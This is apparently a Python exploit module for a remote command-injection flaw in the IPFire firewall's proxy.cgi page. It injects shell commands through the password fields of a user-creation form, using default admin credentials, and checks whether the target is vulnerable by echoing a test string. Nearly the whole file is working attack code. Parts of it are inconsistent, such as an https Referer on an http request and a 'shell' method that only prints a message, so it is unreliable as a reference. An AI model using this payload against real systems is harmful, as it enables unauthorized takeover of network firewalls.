# rsf exploit module
# description: Module exploits IPFire < 2.19 Core Update 101 Remote Code Execution 
# vulnerability which allows executing commands on operating system level.

import requests

class Exploit:
    __info__ = {
        "name": "IPFire Proxy RCE",
        "description": "Module exploits IPFire < 2.19 Core Update 101 Remote Code Execution "
                       "vulnerability which allows executing commands on operating system level.",
        "authors": (
            "Yann CAM",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/39765/",
            "http://www.ipfire.org/news/ipfire-2-19-core-update-101-released",
        ),
        "devices": (
            "IPFire < 2.19 Core Update 101",
        )
    }

    def __init__(self, target, port=444, ssl=True, username="admin", password="admin"):
        self.target = target
        self.port = port
        self.ssl = ssl
        self.username = username
        self.password = password

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            self.shell()
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{'https' if self.ssl else 'http'}://{self.target}:{self.port}/cgi-bin/proxy.cgi",
        }

        payload = f"||{cmd};#"

        data = {
            "NCSA_USERNAME": "random_text",
            "NCSA_GROUP": "standard",
            "NCSA_PASS": payload,
            "NCSA_PASS_CONFIRM": payload,
            "SUBMIT": "Create+user",
            "ACTION": "Add",
            "NCSA_MIN_PASS_LEN": "6",
        }

        response = requests.post(f"http://{self.target}:{self.port}/cgi-bin/proxy.cgi", headers=headers, data=data, auth=(self.username, self.password))

        return response.text

    def check(self):
        response = self.execute("echo test")

        if "test" in response:
            return True

        return False

    def shell(self):
        print("Shell access granted")


